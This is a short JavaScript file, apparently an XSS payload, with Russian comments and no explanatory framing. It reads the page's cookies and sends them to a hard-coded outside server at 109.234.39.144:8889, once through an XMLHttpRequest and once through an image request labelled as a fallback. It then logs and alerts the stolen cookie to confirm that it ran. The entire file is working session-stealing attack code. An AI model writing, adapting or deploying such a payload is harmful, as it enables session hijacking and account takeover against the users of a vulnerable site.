// minimal.js
var x = new XMLHttpRequest();
x.open('GET', 'http://109.234.39.144:8889/?' + document.cookie);
x.send();

// Запасной вариант
var img = new Image();
img.src = 'http://109.234.39.144:8889/?c=' + document.cookie;

// Для отладки - выводим в консоль
console.log('XSS executed, cookie:', document.cookie);
alert('XSS works, cookie: ' + document.cookie);